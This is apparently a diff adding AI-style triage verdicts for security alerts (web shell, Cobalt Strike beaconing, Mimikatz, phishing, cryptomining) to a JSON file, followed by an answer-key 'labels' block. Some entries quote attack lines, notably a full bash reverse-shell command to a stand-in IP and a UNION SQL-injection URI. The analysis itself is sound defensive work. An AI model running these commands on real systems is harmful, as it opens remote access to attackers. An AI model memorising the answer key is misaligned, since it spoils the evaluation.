+        "Host BUILD-AGENT-12 is a CI/CD build agent \u2014 a sensitive, high-value system with potential supply-chain blast radius if compromised.",
+        "No prior alerts for BUILD-AGENT-12 or pool.minexmr.example in the last 30 days (168h and 720h lookbacks), ruling out known false-positive or recurring authorized activity.",
+        "Absence of file hashes and IPs limits further enrichment, but process name and mining pool domain alone are sufficient for a high-confidence verdict."
+      ]
+    },
+    "A-0020": {
+      "alert_id": "A-0020",
+      "severity": "high",
+      "confidence": 0.88,
+      "mitre_technique_id": "T1133",
+      "mitre_technique_name": "External Remote Services",
+      "recommended_action": "contain",
+      "rationale": "A successful interactive RDP session (logon type 10) to production host APP-PROD-09 originated from 203.0.113.188, geolocated in Romania (outside all authorized office/VPN ranges). TI lookup returned a suspicious verdict with a risk score of 64/100 and an active RDP brute-force category, last seen on the same day as this alert. User b.nguyen has no prior alerts suggesting legitimate foreign access. The combination of a brute-force-associated IP achieving a successful RDP logon to a production server strongly indicates credential compromise or unauthorized access. Immediate containment is recommended: terminate the active session, lock the b.nguyen account, isolate APP-PROD-09, and initiate a full credential and host forensic review.",
+      "supporting_observations": [
+        "IP 203.0.113.188 flagged as suspicious with risk score 64/100, categorized as rdp-bruteforce, last seen 2026-05-27",
+        "Logon type 10 confirms a successful interactive RDP session \u2014 not a failed probe",
+        "Source geo is Romania (RO), outside all known office and VPN ranges",
+        "No prior alerts for user b.nguyen in the last 7 days \u2014 no known pattern of foreign logins",
+        "No prior alerts for host APP-PROD-09 \u2014 production server with no baseline of external RDP",
+        "No prior alerts from this IP in the last 7 days \u2014 first-time appearance coinciding with a successful login",
+        "MITRE mapping: T1133 (External Remote Services / Initial Access) and T1021.001 (RDP / Lateral Movement)"
+      ]
+    },
+    "A-0021": {
+      "alert_id": "A-0021",
+      "severity": "high",
+      "confidence": 0.93,
+      "mitre_technique_id": "T1190",
+      "mitre_technique_name": "Exploit Public-Facing Application",
+      "recommended_action": "contain",
+      "rationale": "All evidence converges on a credible, active SQL injection attack against the public storefront (shop-edge-01). (1) The IDS rule \"SQLi-UNION\" fired on a classic UNION-based payload in the URI (/product?id=1 UNION SELECT), a textbook T1190 technique. (2) The source IP 198.51.100.205 carries a threat-intelligence risk score of 90/100, is categorized as \"malicious\" under \"exploitation\" and \"web-attack\", and was last seen today (2026-05-28). (3) Alert history shows this IP was already flagged ~1 hour before this alert, indicating sustained, repeated probing rather than a one-off scanner hit. (4) The target host (shop-edge-01) is a public-facing edge node, making successful exploitation high-impact (potential data exfiltration, authentication bypass, or full DB compromise). Recommended action is CONTAIN: block the source IP at the perimeter/WAF immediately, review web server and DB logs on shop-edge-01 for any successful injection responses, and assess whether any data was returned to the attacker before blocking.",
+      "supporting_observations": [
+        "Source IP 198.51.100.205 rated MALICIOUS by threat intelligence with risk score 90/100, categorized under 'exploitation' and 'web-attack'.",
+        "UNION-based SQLi payload detected in URI: /product?id=1%20UNION%20SELECT \u2014 matches Suricata rule SQLi-UNION.",
+        "IP 198.51.100.205 had a prior alert on shop-edge-01 approximately 1 hour earlier (2026-05-28T07:41:12Z), indicating sustained probing.",
+        "Target host shop-edge-01 is a public-facing storefront edge node \u2014 high-value target with broad attack surface.",
+        "MITRE ATT&CK best-fit: T1190 (Exploit Public-Facing Application) under Initial Access tactic."
+      ]
+    },
+    "A-0022": {
+      "alert_id": "A-0022",
+      "severity": "critical",
+      "confidence": 0.99,
+      "mitre_technique_id": "T1505.003",
+      "mitre_technique_name": "Server Software Component: Web Shell",
+      "recommended_action": "escalate",
+      "rationale": "All evidence converges on a confirmed, active web shell compromise of the internet-facing host shop-edge-01. (1) Hash enrichment: the file C:\\inetpub\\wwwroot\\status.aspx (SHA256 c0ffee11...) is positively identified as the ChinaChopper web shell family with 44 AV detections and signatures 'Backdoor:ASP/Webshell' and 'Trojan:Script/Chopper', first seen 2026-01-22. (2) Process chain: w3wp.exe (IIS worker) spawning cmd.exe is the canonical indicator of web shell command execution \u2014 an attacker is issuing OS commands through the web shell. (3) Exploit precursor: the alert describes an exploit attempt immediately before the .aspx file appeared, consistent with T1190 (Exploit Public-Facing Application) as the initial access vector. (4) Host history: shop-edge-01 had a prior alert just 68 minutes earlier (07:41 UTC vs. 08:49 UTC), suggesting the attacker was already probing or staging before dropping the shell. (5) MITRE mapping strongly supports T1505.003 (Web Shell) for persistence/execution, with T1190 as the initial access technique. Immediate containment and escalation are required: isolate shop-edge-01 from the network, preserve forensic artifacts, revoke any credentials accessible from the host, and initiate IR procedures to assess lateral movement and data exfiltration.",
+      "supporting_observations": [
+        "Hash c0ffee11deadbeef22cafe33babe44f00d55ba5e66c0de77fa11ce88da7a99b0 confirmed as ChinaChopper web shell: known_malware=true, 44 detections, signatures Backdoor:ASP/Webshell and Trojan:Script/Chopper",
+        "File dropped at C:\\inetpub\\wwwroot\\status.aspx \u2014 web root location consistent with attacker-accessible backdoor",
+        "w3wp.exe (IIS) spawning cmd.exe is the hallmark process chain of active web shell command execution",
+        "Exploit attempt preceded the file write, indicating T1190 (Exploit Public-Facing Application) as the initial access vector",
+        "shop-edge-01 had a prior alert at 07:41 UTC, ~68 minutes before this event, suggesting earlier attacker activity on the same host",
+        "MITRE ATT&CK mapping: T1505.003 (Web Shell / Persistence), T1190 (Initial Access), T1059.003 (Windows Command Shell / Execution)"
+      ]
+    },
+    "A-0023": {
+      "alert_id": "A-0023",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1071",
+      "mitre_technique_name": "Application Layer Protocol",
+      "recommended_action": "escalate",
+      "rationale": "All evidence converges on an active Cobalt Strike C2 compromise. The destination IP (203.0.113.99) scored 95/100 malicious with explicit 'c2' and 'cobalt-strike' threat categories, last seen today. The domain cdn-update-sync.net is confirmed on the threat-intel C2 blocklist. The beaconing pattern \u2014 jittered HTTPS every 60 seconds \u2014 is a textbook Cobalt Strike default sleep/jitter behavior. Host FIN-WS-118 also has a prior suspicious alert from 2 days ago (2026-05-27), indicating this is not an isolated incident and the host may have been compromised for at least 48 hours. No benign explanation exists for this combination of indicators. Immediate escalation and containment of FIN-WS-118 is warranted: isolate the host from the network, initiate IR procedures, and conduct forensic investigation for lateral movement, credential theft, and persistence mechanisms.",
+      "supporting_observations": [
+        "IP 203.0.113.99 reputation: MALICIOUS, risk score 95/100, categories: [c2, cobalt-strike], last seen 2026-05-29 (today)",
+        "Domain cdn-update-sync.net matched threat-intel C2 list (ti_match: c2_known) on Palo Alto Firewall",
+        "Beaconing interval of 60 seconds with jitter is consistent with Cobalt Strike default C2 sleep configuration",
+        "Host FIN-WS-118 has 1 prior alert within the last 7 days (seen 2026-05-27T12:02:55Z), indicating pre-existing suspicious activity",
+        "MITRE ATT&CK mapping: T1071 Application Layer Protocol (Command and Control tactic) \u2014 HTTPS used to blend C2 traffic with legitimate web traffic"
+      ]
+    },
+    "A-0024": {
+      "alert_id": "A-0024",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1003",
+      "mitre_technique_name": "OS Credential Dumping",
+      "recommended_action": "escalate",
+      "rationale": "All evidence converges on a confirmed, active Mimikatz credential-dumping incident on a domain controller. Hash enrichment confirmed the SHA256 as known Mimikatz malware (58 detections, family: Mimikatz, signature: HackTool:Win32/Mimikatz). MITRE mapping strongly aligns with T1003 (OS Credential Dumping). The target host DC-01 is a domain controller \u2014 the highest-value target in an AD environment \u2014 and had a prior alert just ~63 minutes before this one, indicating sustained or escalating attacker activity. Mimikatz on a DC can yield NTLM hashes, Kerberos tickets (enabling Pass-the-Hash/Pass-the-Ticket/Golden Ticket attacks), and plaintext credentials, posing an immediate risk of full domain compromise. Immediate escalation, isolation of DC-01, and incident response engagement are warranted.",
+      "supporting_observations": [
+        "Hash aa11bb22...8899 confirmed as Mimikatz malware with 58 threat intel detections (enrich_hash)",
+        "Defender EDR signature match: HackTool:Win32/Mimikatz on domain controller DC-01",
+        "MITRE ATT&CK mapping: T1003 OS Credential Dumping (Credential Access tactic)",
+        "Prior alert on DC-01 approximately 63 minutes before this alert (HIST-host-DC-01 at 21:11 UTC), suggesting ongoing attacker presence",
+        "No prior hash alerts in the environment \u2014 first-time execution of this specific Mimikatz binary"
+      ]
+    },
+    "A-0025": {
+      "alert_id": "A-0025",
+      "severity": "high",
+      "confidence": 0.9,
+      "mitre_technique_id": "T1055",
+      "mitre_technique_name": "Process Injection",
+      "recommended_action": "contain",
+      "rationale": "rundll32.exe used CreateRemoteThread to inject code into explorer.exe on host MKT-WS-244 \u2014 a textbook T1055 Process Injection pattern strongly associated with malware (Cobalt Strike, RATs, post-exploitation frameworks). MITRE mapping returned a high-confidence match (score 3). The host had a prior alert just ~2.4 hours earlier (HIST-host-MKT-WS-244), suggesting an ongoing or multi-stage compromise. rundll32.exe is a well-known LOLBin abused to proxy malicious DLL execution, and explorer.exe is a prime injection target for persistence and defense evasion. No benign or authorized explanation exists for this API call chain. Immediate containment of MKT-WS-244 is warranted to prevent lateral movement or data exfiltration.",
+      "supporting_observations": [
+        "MITRE ATT&CK T1055 (Process Injection / Defense Evasion) matched with score 3 \u2014 highest confidence tier.",
+        "rundll32.exe invoked CreateRemoteThread targeting explorer.exe \u2014 a classic malware injection chain used by Cobalt Strike, Metasploit, and commodity RATs.",
+        "Host MKT-WS-244 had 1 prior alert within the last 168 hours (seen at 2026-05-27T17:33:50Z, ~2.4 hours before this alert), indicating a pattern of suspicious activity.",
+        "rundll32.exe is a Living-off-the-Land Binary (LOLBin) with no legitimate use case for remote thread injection into explorer.exe.",
+        "explorer.exe is a high-value injection target: persistent, user-context privileges, blends into normal process trees \u2014 ideal for stealth and persistence."
+      ]
+    },
+    "A-0026": {
+      "alert_id": "A-0026",
+      "severity": "high",
+      "confidence": 0.93,
+      "mitre_technique_id": "T1566.002",
+      "mitre_technique_name": "Spearphishing Link",
+      "recommended_action": "contain",
+      "rationale": "User s.alvarez clicked a confirmed spearphishing link to login-microsoftonline-secure.com, a 2-day-old domain explicitly categorized as phishing by Zscaler, impersonating Microsoft 365. MITRE mapping returns T1566.002 (Spearphishing Link) with maximum confidence. The domain's extreme youth (2 days) is a hallmark of purpose-built phishing infrastructure. No prior alerts exist for either the domain or the user, indicating a fresh, targeted attack. Because the user reached a credential harvesting page, credential compromise must be assumed. Immediate containment actions are required: force-reset s.alvarez's M365 credentials, revoke active sessions/tokens, block the domain at the proxy and DNS layers, and investigate M365 sign-in logs for anomalous logins post-click.",
+      "supporting_observations": [
+        "Domain login-microsoftonline-secure.com is only 2 days old \u2014 consistent with purpose-built phishing infrastructure.",
+        "Zscaler Proxy explicitly categorized the destination as 'phishing'.",
+        "MITRE ATT&CK mapping returns T1566.002 (Spearphishing Link) with a perfect match score of 1.0.",
+        "User s.alvarez has no prior alerts in the last 7 days, suggesting a targeted/first-contact spearphishing attempt.",
+        "Domain has no prior alert history in the last 7 days, indicating a newly deployed phishing campaign.",
+        "Domain name 'login-microsoftonline-secure.com' is a typosquat/impersonation of Microsoft's legitimate login domain (login.microsoftonline.com)."
+      ]
+    },
+    "A-0027": {
+      "alert_id": "A-0027",
+      "severity": "high",
+      "confidence": 0.82,
+      "mitre_technique_id": "T1567",
+      "mitre_technique_name": "Exfiltration Over Web Service",
+      "recommended_action": "investigate",
+      "rationale": "User k.brennan uploaded 1.2 GB of corporate documents to a personal Dropbox account in violation of data-handling policy, mapping directly to T1567 (Exfiltration Over Web Service, MITRE score 1.0). The data volume is substantial and the destination is explicitly a personal account, ruling out an approved corporate integration. No prior alerts exist for k.brennan in the last 30 days or for dropbox.com in the last 7 days, so this is an isolated, first-observed event rather than a known pattern. Severity is elevated to high given the volume and policy breach. Immediate investigation is required to classify the uploaded files, determine intent (insider threat, negligence, or authorized exception), and preserve evidence before any further exfiltration occurs. Containment (e.g., blocking Dropbox access or suspending the account) should follow if investigation confirms malicious or unauthorized intent.",
+      "supporting_observations": [
+        "MITRE ATT&CK mapping: T1567 Exfiltration Over Web Service \u2014 score 1.0 (highest confidence match)",
+        "1.2 GB uploaded to a personal (non-corporate) Dropbox account \u2014 significant data volume indicative of bulk staging or exfiltration",
+        "Explicit data-handling policy violation flagged by Forcepoint DLP",
+        "Account type confirmed as 'personal', excluding corporate Dropbox integration as an explanation",
+        "No prior alerts for user k.brennan in the last 30 days \u2014 isolated, first-observed event",
+        "No recent alerts for dropbox.com in the last 7 days \u2014 not a widespread org-wide issue, isolated to this user"
+      ]
+    },
+    "A-0028": {
+      "alert_id": "A-0028",
+      "severity": "critical",
+      "confidence": 0.98,
+      "mitre_technique_id": "T1059.004",
+      "mitre_technique_name": "Unix Shell",
+      "recommended_action": "contain",
+      "rationale": "All evidence strongly confirms an active, in-progress reverse shell attack on a public-facing web server (shop-edge-01). The command line 'bash -i >& /dev/tcp/198.51.100.205/4444 0>&1' is the textbook bash reverse shell one-liner, redirecting an interactive shell's stdin/stdout/stderr over a TCP socket to an attacker-controlled host on port 4444. The destination IP 198.51.100.205 was rated MALICIOUS with a risk score of 90/100, categorized under 'exploitation' and 'web-attack' by threat intelligence, and was last seen TODAY (2026-05-28) \u2014 indicating an active threat actor. Prior alert history shows this IP and the host shop-edge-01 were already flagged ~80 minutes before this alert, suggesting a multi-stage intrusion may be underway (initial access \u2192 execution \u2192 C2). Immediate containment of shop-edge-01 is required to cut the attacker's interactive access before lateral movement or data exfiltration occurs.",
+      "supporting_observations": [
+        "Command line 'bash -i >& /dev/tcp/198.51.100.205/4444 0>&1' is a canonical bash reverse shell, mapping to T1059.004 (Unix Shell) under the Execution tactic.",
+        "Destination IP 198.51.100.205 has a TI reputation of MALICIOUS, risk score 90/100, categorized as 'exploitation' and 'web-attack', last seen 2026-05-28 (same day as alert).",
+        "Prior alert history for IP 198.51.100.205 exists from ~80 minutes before this alert (07:41 UTC vs 09:02 UTC), suggesting earlier reconnaissance or initial access activity.",
+        "Prior alert history for host shop-edge-01 also exists from the same earlier timestamp, corroborating a multi-stage intrusion sequence on this host.",
+        "Port 4444 is a well-known attacker-preferred port for reverse shell C2 (commonly used by Metasploit and similar frameworks).",
+        "The source is a public-facing web server ('shop-edge-01'), making this a high-value target with likely internet exposure and potential for lateral movement into internal networks."
+      ]
+    },
+    "A-0029": {
+      "alert_id": "A-0029",
+      "severity": "high",
+      "confidence": 0.88,
+      "mitre_technique_id": "T1547.001",
+      "mitre_technique_name": "Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder",
+      "recommended_action": "contain",
+      "rationale": "A registry Run key named 'Sync' was added under HKCU pointing to C:\\Users\\Public\\s.vbs \u2014 a world-writable staging directory with a single-letter, obfuscated VBScript filename. This combination is a strong indicator of malicious persistence: legitimate software does not drop scripts to C:\\Users\\Public\\ with abbreviated names. MITRE mapping confirms T1547.001 (Boot or Logon Autostart Execution via Registry Run Keys). The host ENG-WS-309 also had a prior alert within the last 24 hours, suggesting this may be part of a broader compromise chain. No file hash was available to enrich, but the behavioral pattern (LotL VBScript + public staging path + generic value name 'Sync') warrants immediate containment of the host and investigation of the s.vbs script content. EDR-reported severity of 'low' is insufficient given the full context.",
+      "supporting_observations": [
+        "Registry Run key 'Sync' added under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to C:\\Users\\Public\\s.vbs",
+        "C:\\Users\\Public\\ is a world-writable directory commonly abused for malware staging \u2014 not a legitimate application install path",
+        "Script filename 's.vbs' is single-character and obfuscated, consistent with malicious naming conventions",
+        "VBScript is a Living-off-the-Land script (LOLBAS) frequently used for stealthy execution and persistence",
+        "ENG-WS-309 had a prior alert within the last 24 hours (2026-05-26T19:05:41Z), suggesting ongoing or multi-stage activity",
+        "MITRE ATT&CK mapping: T1547.001 (Persistence) and T1112 (Defense Evasion / Modify Registry) both matched by tool"
+      ]
+    },
+    "A-0030": {
+      "alert_id": "A-0030",
+      "severity": "medium",
+      "confidence": 0.65,
+      "mitre_technique_id": "T1566",
+      "mitre_technique_name": "Phishing",
+      "recommended_action": "investigate",
+      "rationale": "A single DNS lookup to 'promo-deals-today.info' \u2014 a domain registered only 1 day ago \u2014 was made from SALES-WS-077. Newly registered domains with promotional/lure-style names are a well-known indicator of phishing infrastructure or freshly stood-up C2. While no follow-on traffic has been observed yet, this represents a narrow window to investigate before potential compromise deepens. Compounding concern: SALES-WS-077 had a separate prior alert just 1 hour earlier (HIST-host-SALES-WS-077, severity unknown), suggesting this host may already be exhibiting a pattern of suspicious activity. The domain has no prior alert history, consistent with newly deployed attacker infrastructure. No TI hits were returned for the domain, but absence of TI on a 1-day-old domain is expected \u2014 malicious infrastructure often precedes TI coverage. MITRE best-fit is T1566 (Phishing) as the likely initial access vector for a sales workstation. Confidence is moderate (0.65) because no follow-on traffic, file execution, or confirmed malicious payload has been observed. Recommended action: investigate the host's browser/email history to determine how the DNS request was triggered, review the prior alert on SALES-WS-077, and consider proactively blocking the domain at the DNS layer.",
+      "supporting_observations": [
+        "Domain 'promo-deals-today.info' is only 1 day old \u2014 a strong indicator of phishing or C2 infrastructure.",
+        "Lure-style domain name ('promo-deals-today') is consistent with phishing campaign naming conventions targeting sales staff.",
+        "No prior alert history for the domain in the last 168 hours \u2014 consistent with newly deployed attacker infrastructure that has not yet been indexed by TI feeds.",
+        "SALES-WS-077 had a prior alert (HIST-host-SALES-WS-077) just 1 hour before this event, suggesting a pattern of suspicious activity on this host.",
+        "No follow-on traffic observed yet \u2014 provides a time-sensitive window to investigate and contain before escalation.",
+        "Single low-volume DNS request (count=1) may indicate initial beacon or a user clicking a phishing link for the first time."
+      ]
+    },
+    "A-0031": {
+      "alert_id": "A-0031",
+      "severity": "low",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1110",
+      "mitre_technique_name": "Brute Force",
+      "recommended_action": "monitor",
+      "rationale": "Alert attributes 28 failed logins for service account 'svc-reports' from host 'RPT-APP-01' to an internal misconfigured service \u2014 not an external threat actor. No successful authentication occurred, ruling out credential compromise. MITRE mapping best fits T1110 (Brute Force) in pattern, but the root cause is a stale/incorrect credential in a service or scheduled task. No prior alerts exist for either 'svc-reports' or 'RPT-APP-01' in the past 7 days, and no malicious IPs, file hashes, or domains are involved. The lockout itself is a protective control working as intended. Severity downgraded from reported 'medium' to 'low' given the confirmed internal, non-adversarial source. Recommended action is to monitor and remediate the misconfiguration (update service credentials), but no escalation or containment is warranted.",
+      "supporting_observations": [
+        "28 failed login attempts for svc-reports resulted in account lockout \u2014 no successful authentication recorded.",
+        "Source explicitly identified as 'internal_service_misconfig', not an external or adversarial origin.",
+        "Zero prior alerts for user 'svc-reports' in the last 168 hours \u2014 no pattern of repeat suspicious activity.",
+        "Zero prior alerts for host 'RPT-APP-01' in the last 168 hours \u2014 no corroborating malicious activity.",
+        "No malicious observables present: no IPs, file hashes, domains, or suspicious processes in the alert.",
+        "MITRE T1110 (Brute Force) is the closest technique match by pattern, but context strongly indicates misconfiguration rather than adversarial credential access."
+      ]
+    },
+    "A-0032": {
+      "alert_id": "A-0032",
+      "severity": "informational",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1021.001",
+      "mitre_technique_name": "Remote Desktop Protocol",
+      "recommended_action": "close_false_positive",
+      "rationale": "All evidence strongly supports this being a fully authorized, benign event: (1) The alert metadata explicitly confirms an approved maintenance window (approved_window: true) and a valid vendor contract (VC-2210). (2) The session was routed through the sanctioned jump host JUMP-01, consistent with policy. (3) IP 10.50.0.9 is an internal RFC-1918 address with no threat intelligence hits (score 0, reputation unknown/clean). (4) User vendor.acme and host JUMP-01 have zero prior alerts in the last 168 hours, indicating no pattern of suspicious behavior. (5) MITRE T1021.001 (RDP) is the best-fit technique for the activity type, but in this context it represents authorized remote access, not lateral movement by a threat actor. The SIEM alert was triggered by heuristic anomaly detection on an RDP login that is fully explained by the approved vendor maintenance activity.",
+      "supporting_observations": [
+        "approved_window: true \u2014 session falls within a pre-authorized maintenance window",
+        "vendor_contract: VC-2210 \u2014 contracted vendor with a valid agreement on file",
+        "Session routed via sanctioned jump host JUMP-01, consistent with access policy",
+        "IP 10.50.0.9 is internal (RFC-1918); TI lookup returned score 0 with no threat categories",
+        "No prior alerts for user vendor.acme or host JUMP-01 in the past 7 days",
+        "MITRE mapping: T1021.001 (RDP / Lateral Movement) \u2014 technique matches activity type but context is fully authorized"
+      ]
+    },
+    "A-0033": {
+      "alert_id": "A-0033",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1027",
+      "mitre_technique_name": "Obfuscated Files or Information",
+      "recommended_action": "contain",
+      "rationale": "The SHA256 hash (dec0de00...) was positively identified as TrojanDropper:JS/Nemucod with 29 threat intelligence detections, first seen 2026-04-02. Nemucod is a well-known dropper family historically used to deliver ransomware (e.g., Locky) and banking trojans. The dropper uses char-code + concat obfuscation (T1027) to evade detection and reconstructs a second-stage payload at runtime, meaning the endpoint is likely already executing or staging additional malicious code. Host HR-WS-051 also had a prior suspicious alert just 60 minutes earlier (HIST-host-HR-WS-051 at 09:36), indicating an active, progressing compromise. Immediate containment of HR-WS-051 is warranted to prevent lateral movement or data exfiltration from the second-stage payload. Escalation to IR team is recommended for forensic investigation of the full kill chain.",
+      "supporting_observations": [
+        "Hash dec0de00ab12cd34ef56ab78cd90ef12ab34cd56ef78ab90cd12ef34ab56cd78 confirmed as known malware: TrojanDropper:JS/Nemucod, 29 detections, first seen 2026-04-02.",
+        "wscript.exe used to execute heavily obfuscated JScript dropper with char-code + concat technique \u2014 consistent with Nemucod TTPs.",
+        "MITRE T1027 (Obfuscated Files or Information, Defense Evasion) matched with high confidence.",
+        "Host HR-WS-051 had a prior suspicious alert 60 minutes before this event (HIST-host-HR-WS-051, 2026-05-28T09:36:48Z), indicating active and escalating compromise.",
+        "Dropper is designed to reconstruct and launch a second-stage payload, meaning the threat extends beyond the initial JS file.",
+        "Hash has no prior alert history in the environment \u2014 this is a novel infection vector, not a known false positive."
+      ]
+    },
+    "A-0034": {
+      "alert_id": "A-0034",
+      "severity": "low",
+      "confidence": 0.82,
+      "mitre_technique_id": "T1133",
+      "mitre_technique_name": "External Remote Services",
+      "recommended_action": "monitor",
+      "rationale": "VPN login by p.santos from Portugal (PT) \u2014 a new geography for this account \u2014 is the sole anomaly. All other signals are benign: the source IP (203.0.113.221) has a clean reputation (risk score 5/100, no threat categories), no prior alerts exist for either the IP or the user in the past 7 days, credentials were valid, and MFA was successfully satisfied. This profile is consistent with legitimate travel or remote work rather than account compromise. Closing as a false positive would be premature given the new-geo flag, so monitoring is recommended to detect any follow-on suspicious activity (e.g., impossible travel, privilege escalation, or data exfiltration) that would warrant escalation.",
+      "supporting_observations": [
+        "IP 203.0.113.221 reputation: clean, risk score 5/100, no threat categories (bundled-ti, 2026-05-25)",
+        "Zero prior alerts for IP 203.0.113.221 in the last 168 hours",
+        "Zero prior alerts for user p.santos in the last 168 hours",
+        "MFA: passed \u2014 multi-factor authentication successfully satisfied",
+        "New geography: PT (Portugal) \u2014 anomalous but low-risk country with no associated threat intelligence",
+        "MITRE T1133 (External Remote Services) is the best-fit technique for VPN-based access"
+      ]
+    },
+    "A-0035": {
+      "alert_id": "A-0035",
+      "severity": "high",
+      "confidence": 0.87,
+      "mitre_technique_id": "T1021.002",
+      "mitre_technique_name": "Remote Services: SMB/Windows Admin Shares",
+      "recommended_action": "contain",
+      "rationale": "PsExec (PSEXESVC.exe) was used by the privileged account 'adm.helpdesk' to create a remote service on ENG-WS-309 via SMB from ENG-WS-211 \u2014 a classic T1021.002 lateral movement pattern. Workstation-to-workstation PsExec is highly anomalous and not consistent with legitimate helpdesk operations. The user 'adm.helpdesk' has zero prior lateral movement alerts in the last 7 days, providing no baseline to dismiss this as authorized. Critically, ENG-WS-211 (the source) had a separate prior alert earlier the same day (13:09Z vs. 21:05Z), strongly suggesting it may already be compromised and being used as a pivot host. ENG-WS-309 also had a prior alert 2 days prior. PSEXESVC.exe has no prior alert history in the last 30 days, ruling out a known-good recurring pattern. The behavioral chain \u2014 privileged account + SMB service creation + workstation-to-workstation movement \u2014 is consistent with an adversary performing post-exploitation lateral movement, potentially following credential theft. Immediate containment of both hosts and the adm.helpdesk account is recommended pending forensic investigation.",
+      "supporting_observations": [
+        "PSEXESVC.exe spawned on ENG-WS-309 via SMB from ENG-WS-211 using privileged account adm.helpdesk",
+        "Workstation-to-workstation PsExec is anomalous; legitimate use is typically admin-to-server",
+        "adm.helpdesk has 0 prior alerts in the last 7 days \u2014 no established PsExec baseline",
+        "ENG-WS-211 (source host) had a prior alert earlier the same day at 13:09Z, ~8 hours before this event \u2014 possible prior compromise",
+        "ENG-WS-309 (destination host) had a prior alert 2 days ago (2026-05-26)",
+        "PSEXESVC.exe has no prior alert history in the last 30 days, ruling out a known-good recurring pattern",
+        "MITRE ATT&CK mapping: T1021.002 Remote Services: SMB/Windows Admin Shares (Lateral Movement tactic)"
+      ]
+    },
+    "A-0036": {
+      "alert_id": "A-0036",
+      "severity": "low",
+      "confidence": 0.88,
+      "mitre_technique_id": "T1566",
+      "mitre_technique_name": "Phishing",
+      "recommended_action": "monitor",
+      "rationale": "A user-reported phishing email was quarantined by Proofpoint with zero interaction (no clicks, no replies). MITRE mapping confirms T1566 (Phishing / Initial Access). The sender domain 'secure-billing-update.co' follows a classic phishing naming pattern (billing urgency + non-standard TLD), though no prior alerts were found for this domain or the reporting user in the last 7 days \u2014 suggesting a newly registered or low-volume phishing domain. Because the email was fully contained before any harm occurred, severity is low. The domain should be added to the block list and monitored for future delivery attempts or related infrastructure. No file hashes or IPs were present to enrich further.",
+      "supporting_observations": [
+        "Email quarantined by Proofpoint with confirmed zero interaction (no click, no reply).",
+        "Domain 'secure-billing-update.co' matches classic phishing naming conventions: billing urgency lure + non-standard .co TLD.",
+        "No prior alert history for domain 'secure-billing-update.co' in the last 168 hours \u2014 may be a newly registered phishing domain.",
+        "No prior alert history for user 'reporter@corp.example' \u2014 no indicators of account compromise.",
+        "MITRE ATT&CK mapping: T1566 (Phishing, Initial Access) confirmed with high-confidence keyword match."
+      ]
+    },
+    "A-0037": {
+      "alert_id": "A-0037",
+      "severity": "high",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1496",
+      "mitre_technique_name": "Resource Hijacking",
+      "recommended_action": "contain",
+      "rationale": "AWS GuardDuty fired finding CryptoCurrency:EC2/BitcoinTool.B!DNS on EC2 instance i-0ab12cd34ef567890, which was observed resolving and connecting to the known XMR (Monero) mining pool domain xmr.pool-mine.example. MITRE mapping strongly aligns with T1496 (Resource Hijacking), a well-understood impact-phase technique used by cryptojackers. No prior alert history exists for either the domain or the host over the past 30 days, ruling out a known-benign or repeat-noise pattern. The GuardDuty finding type (BitcoinTool.B!DNS) is a high-fidelity, low-false-positive signal \u2014 it specifically identifies DNS resolution to a categorized mining pool endpoint. The combination of: (1) a trusted AWS-native detection source, (2) a named crypto-mining pool domain with XMR prefix, (3) a first-time-seen host with no authorized mining workload context, and (4) an off-hours timestamp (02:44 UTC) strongly indicates active compromise and unauthorized cryptomining. Severity is raised from reported 'medium' to 'high' given the confirmed mining pool contact and likely ongoing resource abuse. Immediate containment is recommended: isolate the instance via security group changes, capture memory/disk forensics, revoke any IAM roles attached to the instance, and investigate the initial access vector.",
+      "supporting_observations": [
+        "GuardDuty finding CryptoCurrency:EC2/BitcoinTool.B!DNS \u2014 a high-fidelity, purpose-built detection for crypto-mining pool contact via DNS.",
+        "Domain xmr.pool-mine.example contains 'xmr' prefix (Monero) and 'pool-mine' \u2014 consistent with a cryptocurrency mining pool endpoint.",
+        "MITRE ATT&CK mapping returned T1496 (Resource Hijacking) as a top match alongside T1071 (Application Layer Protocol / C2 comms).",
+        "No prior alert history for domain xmr.pool-mine.example or host i-0ab12cd34ef567890 over the past 30 days \u2014 first-time detection, not a known false-positive pattern.",
+        "Alert triggered at 02:44 UTC \u2014 off-hours activity reduces likelihood of authorized/interactive use.",
+        "No file hashes or process data available to further scope the malware, reinforcing need for forensic investigation of the instance."
+      ]
+    },
+    "A-0038": {
+      "alert_id": "A-0038",
+      "severity": "critical",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1053.005",
+      "mitre_technique_name": "Scheduled Task",
+      "recommended_action": "contain",
+      "rationale": "A scheduled task was created on LAB-WS-004 to execute mshta.exe fetching a remote HTA from 198.51.100.31 on every user logon (/sc onlogon). This combines two high-confidence attacker TTPs: (1) T1053.005 \u2014 Scheduled Task for persistence, and (2) T1218.005 \u2014 mshta.exe LOLBin abuse for signed binary proxy execution and defense evasion. TI lookup confirms 198.51.100.31 is actively malicious (score 84/100, malware-hosting category, last seen today 2026-05-28). The host LAB-WS-004 also had a prior alert ~5 hours earlier, indicating this may be a multi-stage compromise. Off-hours execution (03:59 UTC) further supports malicious intent. Immediate containment of LAB-WS-004 is warranted: isolate the host, remove the scheduled task, block 198.51.100.31 at the perimeter, and investigate the prior alert on this host for initial access vector.",
+      "supporting_observations": [
+        "IP 198.51.100.31 confirmed malicious by TI (score 84/100, category: malware-hosting, last seen 2026-05-28)",
+        "mshta.exe used as LOLBin to fetch and execute remote HTA \u2014 classic T1218.005 signed binary proxy execution",
+        "Scheduled task configured with /sc onlogon establishes persistent execution on every user logon (T1053.005)",
+        "LAB-WS-004 had a prior alert at 2026-05-27T22:40Z (~5 hours before this event), suggesting ongoing compromise",
+        "Off-hours execution at 03:59 UTC is consistent with attacker behavior",
+        "No prior alerts for this IP suggest fresh/dedicated C2 infrastructure"
+      ]
+    }
+  },
+  "labels": {
+    "A-0001": {
+      "severity": "high",
+      "mitre_technique_id": "T1110",
+      "recommended_action": "investigate"
+    },
+    "A-0002": {
+      "severity": "critical",
+      "mitre_technique_id": "T1110",
+      "recommended_action": "escalate"
+    },
+    "A-0003": {
+      "severity": "high",
+      "mitre_technique_id": "T1059.001",
+      "recommended_action": "contain"
+    },
